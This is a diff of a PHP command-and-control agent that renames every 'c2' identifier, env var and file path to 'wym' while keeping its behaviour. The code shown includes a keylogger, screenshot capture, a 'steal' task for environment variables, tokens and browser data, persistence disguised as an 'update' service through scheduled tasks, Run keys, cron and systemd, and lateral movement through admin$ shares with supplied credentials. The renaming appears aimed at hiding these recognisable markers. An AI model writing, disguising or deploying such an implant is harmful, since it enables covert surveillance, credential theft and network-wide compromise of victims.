@@ -10,14 +10,14 @@
 //                 --interval 5 --jitter 2 --verbose
 //
 // Environment variables (accepted when the flag is not given):
-//   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+//   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 //
 // Flags:
-//   --server URL      server base URL (required unless C2_SERVER is set)
-//   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+//   --server URL      server base URL (required unless WYM_SERVER is set)
+//   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 //   --interval N      heartbeat interval in seconds (default 10, min 1)
 //   --jitter N        random jitter in seconds added to the interval
-//   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+//   --state FILE      state file persisting the agent id (default ~/.wymagent.json)
 //   --verbose         print activity to stdout
 //   -h, --help        show this help and exit
 //
@@ -31,9 +31,9 @@ define('OUTPUT_LIMIT', 12000);
 function state_file() {
     global $state_file_override;
     if (!empty($state_file_override)) return $state_file_override;
-    $custom = getenv('C2_STATE_FILE');
+    $custom = getenv('WYM_STATE_FILE');
     if ($custom) return $custom;
-    return (getenv('HOME') ?: (getenv('USERPROFILE') ?: '.')) . '/.c2agent.json';
+    return (getenv('HOME') ?: (getenv('USERPROFILE') ?: '.')) . '/.wymagent.json';
 }
 
 // ---------------------------------------------------------------- globals
@@ -370,7 +370,7 @@ function task_sleep($args) {
 
 function klog_base() {
     global $agent_id;
-    return rtrim(sys_get_temp_dir(), '/\\') . DIRECTORY_SEPARATOR . ".c2keylog_$agent_id";
+    return rtrim(sys_get_temp_dir(), '/\\') . DIRECTORY_SEPARATOR . ".wymkeylog_$agent_id";
 }
 
 function proc_alive($pid) {
@@ -419,7 +419,7 @@ PS;
     file_put_contents("$base.ps1", $ps);
     $sh = <<<'SH'
 #!/bin/sh
-C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
+C2P=${C2P:-/tmp/.wymnope}; C2K=${C2K:-/tmp/.wymnope}
 echo $$ > "$C2P"
 kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
 [ -z "$kid" ] && exit 1
@@ -543,7 +543,7 @@ function task_screenshot($task_id, $args) {
     global $server, $token;
     $label = preg_replace('/\s+/', '', $args['name'] ?? 'screenshot');
     if ($label === '') $label = 'screenshot';
-    $tmp = rtrim(sys_get_temp_dir(), '/\\') . DIRECTORY_SEPARATOR . 'c2shot_' . uniqid() . '.png';
+    $tmp = rtrim(sys_get_temp_dir(), '/\\') . DIRECTORY_SEPARATOR . 'wymshot_' . uniqid() . '.png';
 
     if (PHP_OS_FAMILY === 'Windows') {
         $psfile = $tmp . '.ps1';
@@ -601,11 +601,11 @@ PS);
 // PHP process performs the status-check loop; the main agent writes
 // state to a JSON file so start/stop/status can coordinate.
 
-define('CLONE_LOOP_SCRIPT', sys_get_temp_dir() . '/c2_clone_loop.php');
+define('CLONE_LOOP_SCRIPT', sys_get_temp_dir() . '/wym_clone_loop.php');
 
 function clones_file() {
     global $agent_id;
-    return sys_get_temp_dir() . '/.c2clones_' . $agent_id . '.json';
+    return sys_get_temp_dir() . '/.wymclones_' . $agent_id . '.json';
 }
 
 function load_clones() {
@@ -623,7 +623,7 @@ function clone_get_agent_id() {
     global $state_file_override;
     $sf = '';
     if (!empty($state_file_override)) $sf = $state_file_override;
-    else $sf = getenv('C2_STATE_FILE') ?: (getenv('HOME') ?: (getenv('USERPROFILE') ?: '.')) . '/.c2agent.json';
+    else $sf = getenv('WYM_STATE_FILE') ?: (getenv('HOME') ?: (getenv('USERPROFILE') ?: '.')) . '/.wymagent.json';
     if (!file_exists($sf)) return '';
     $d = @json_decode(file_get_contents($sf), true);
     return $d['agent_id'] ?? '';
@@ -938,7 +938,7 @@ function task_steal($task_id, $args) {
     global $server, $token;
     $profile = strtolower(trim($args['profile'] ?? 'all'));
     if (!in_array($profile, ['all', 'env', 'tokens', 'browser'], true)) $profile = 'all';
-    $work = sys_get_temp_dir() . '/c2steal_' . uniqid();
+    $work = sys_get_temp_dir() . '/wymsteal_' . uniqid();
     @mkdir($work, 0755, true);
     $manifest = [];
     try {
@@ -1054,44 +1054,44 @@ function task_persistence($args) {
     $self = realpath(__FILE__) ?: __FILE__;
     try {
         if (PHP_OS_FAMILY === 'Windows') {
-            $base = (getenv('APPDATA') ?: getenv('USERPROFILE')) . '\\Microsoft\\Windows\\c2update';
+            $base = (getenv('APPDATA') ?: getenv('USERPROFILE')) . '\\Microsoft\\Windows\\wymupdate';
             if (!is_dir($base)) @mkdir($base, 0755, true);
-            $dest = $base . '\\c2agent' . (strrchr($self, '.') ?: '');
+            $dest = $base . '\\wymagent' . (strrchr($self, '.') ?: '');
             if (!@copy($self, $dest)) throw new \Exception("cannot copy self to $dest");
             $relaunch = relaunch_cmd($dest);
             $output = "persistence: copied self to $dest";
             $progdata = getenv('ProgramData') ?: (getenv('ALLUSERSPROFILE') ?: 'C:\\ProgramData');
-            $launcher_dir = $progdata . '\\c2update';
+            $launcher_dir = $progdata . '\\wymupdate';
             if (!is_dir($launcher_dir)) @mkdir($launcher_dir, 0755, true);
-            $wrapper = $launcher_dir . '\\c2relaunch.cmd';
+            $wrapper = $launcher_dir . '\\wymrelaunch.cmd';
             file_put_contents($wrapper, "@echo off\r\nstart \"\" /b $relaunch\r\n");
             $output .= "\npersistence: wrote launcher $wrapper";
-            $task = run_shell('schtasks /Create /TN "c2agent-persist" /TR "' . $wrapper . '" /SC ONLOGON /RL HIGHEST /F', 30);
+            $task = run_shell('schtasks /Create /TN "wymagent-persist" /TR "' . $wrapper . '" /SC ONLOGON /RL HIGHEST /F', 30);
             $ok = $task['exit_code'] === 0;
             $output .= "\n" . trim($task['output']);
             if (!$ok) {
-                $reg = run_shell('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v c2agent /t REG_SZ /d "' . $wrapper . '" /f', 30);
+                $reg = run_shell('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v wymagent /t REG_SZ /d "' . $wrapper . '" /f', 30);
                 $ok = $reg['exit_code'] === 0;
                 $output .= "\n" . trim($reg['output']);
             }
             return ['output' => truncate_output($output), 'exit_code' => $ok ? 0 : 1];
         }
         $home = getenv('HOME') ?: (getenv('USERPROFILE') ?: '.');
-        $base = $home . '/.config/c2update';
+        $base = $home . '/.config/wymupdate';
         if (!is_dir($base)) @mkdir($base, 0755, true);
         $dest = $base . '/' . basename($self);
         if (!@copy($self, $dest)) throw new \Exception("cannot copy self to $dest");
         $relaunch = relaunch_cmd($dest);
-        $cron_line = "@reboot $relaunch # c2agent-persist";
-        $cron = run_shell("(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '" . sh_embed($cron_line) . "') | crontab -", 30);
+        $cron_line = "@reboot $relaunch # wymagent-persist";
+        $cron = run_shell("(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo '" . sh_embed($cron_line) . "') | crontab -", 30);
         $ok = $cron['exit_code'] === 0;
         $output = "persistence: copied self to $dest\n" . trim($cron['output']);
-        $unit = $base . '/c2-update.service';
+        $unit = $base . '/wym-update.service';
         file_put_contents($unit,
-            "[Unit]\nDescription=c2 update\n\n"
+            "[Unit]\nDescription=wym update\n\n"
             . "[Service]\nType=simple\nExecStart=/bin/sh -c '" . sh_embed($relaunch) . "'\nRestart=always\n\n"
             . "[Install]\nWantedBy=default.target\n");
-        $sd = run_shell('systemctl --user daemon-reload; systemctl --user enable --now c2-update.service', 30);
+        $sd = run_shell('systemctl --user daemon-reload; systemctl --user enable --now wym-update.service', 30);
         $ok = $ok || $sd['exit_code'] === 0;
         $output .= "\n" . trim($sd['output']);
         return ['output' => truncate_output($output), 'exit_code' => $ok ? 0 : 1];
@@ -1150,9 +1150,9 @@ function task_lateral($args) {
     if (empty($peers)) return ['output' => 'lateral: no LAN peers found', 'exit_code' => 1];
 
     $user = trim((string)($args['user'] ?? ''));
-    if ($user === '') $user = (string)getenv('C2_LAT_USER');
+    if ($user === '') $user = (string)getenv('WYM_LAT_USER');
     $pass = (string)($args['pass'] ?? '');
-    if ($pass === '') $pass = (string)getenv('C2_LAT_PASS');
+    if ($pass === '') $pass = (string)getenv('WYM_LAT_PASS');
     $has_creds = $user !== '' && $pass !== '';
     $self = realpath(__FILE__) ?: __FILE__;
     $basename = basename($self);
@@ -1163,7 +1163,7 @@ function task_lateral($args) {
     foreach ($peers as $host) {
         if (!$has_creds) {
             $skipped++;
-            $status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)';
+            $status = 'skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)';
         } elseif (PHP_OS_FAMILY === 'Windows') {
             $r1 = run_shell('net use \\\\' . $host . '\\admin$ /user:' . $user . ' "' . $pass . '"', 20);
             if ($r1['exit_code'] !== 0) {
@@ -1177,11 +1177,11 @@ function task_lateral($args) {
                     run_shell('net use \\\\' . $host . '\\admin$ /delete /y', 20);
                 } else {
                     $remote = '\\\\' . $host . '\\admin$\\' . $basename;
-                    $r3 = run_shell('schtasks /Create /S ' . $host . ' /TN "c2agent-lateral" /TR "' . $remote . '" /SC ONLOGON /RU ' . $user . ' /RP ' . $pass . ' /RL HIGHEST /F', 20);
+                    $r3 = run_shell('schtasks /Create /S ' . $host . ' /TN "wymagent-lateral" /TR "' . $remote . '" /SC ONLOGON /RU ' . $user . ' /RP ' . $pass . ' /RL HIGHEST /F', 20);
                     run_shell('net use \\\\' . $host . '\\admin$ /delete /y', 20);
                     $deployed++;
                     $status = ($r3['exit_code'] === 0)
-                        ? 'deployed (file dropped + scheduled c2agent-lateral)'
+                        ? 'deployed (file dropped + scheduled wymagent-lateral)'
                         : 'deployed (file dropped; task: ' . err_brief($r3) . ')';
                 }
             }
@@ -1259,22 +1259,22 @@ $args = getopt('h', ['server:', 'token:', 'interval:', 'jitter:', 'verbose', 'st
 if (isset($args['h']) || isset($args['help'])) {
     echo "usage: php agent.php --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n";
     echo "\n";
-    echo "Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):\n";
-    echo "  --server URL      server base URL (required unless C2_SERVER is set)\n";
-    echo "  --token TOKEN     shared agent token (required unless C2_TOKEN is set)\n";
+    echo "Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):\n";
+    echo "  --server URL      server base URL (required unless WYM_SERVER is set)\n";
+    echo "  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)\n";
     echo "  --interval N      heartbeat interval in seconds (default 10, min 1)\n";
     echo "  --jitter N        random jitter in seconds added to the interval\n";
-    echo "  --state FILE      state file persisting the agent id (default ~/.c2agent.json)\n";
+    echo "  --state FILE      state file persisting the agent id (default ~/.wymagent.json)\n";
     echo "  --verbose         print activity to stdout\n";
     echo "  -h, --help        show this help and exit\n";
     exit(0);
 }
-$server = $args['server'] ?? getenv('C2_SERVER') ?: '';
-$token = $args['token'] ?? getenv('C2_TOKEN') ?: '';
-$interval = (int)($args['interval'] ?? getenv('C2_INTERVAL') ?: 10);
-$jitter = (int)($args['jitter'] ?? getenv('C2_JITTER') ?: 0);
-$verbose = isset($args['verbose']) || in_array((string)getenv('C2_VERBOSE'), ['1', 'true'], true);
-$state_file_override = $args['state'] ?? getenv('C2_STATE_FILE') ?: '';
+$server = $args['server'] ?? getenv('WYM_SERVER') ?: '';
+$token = $args['token'] ?? getenv('WYM_TOKEN') ?: '';
+$interval = (int)($args['interval'] ?? getenv('WYM_INTERVAL') ?: 10);
+$jitter = (int)($args['jitter'] ?? getenv('WYM_JITTER') ?: 0);
+$verbose = isset($args['verbose']) || in_array((string)getenv('WYM_VERBOSE'), ['1', 'true'], true);
+$state_file_override = $args['state'] ?? getenv('WYM_STATE_FILE') ?: '';
 
 if (!$server || !$token) {
     fwrite(STDERR, "usage: php agent.php --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
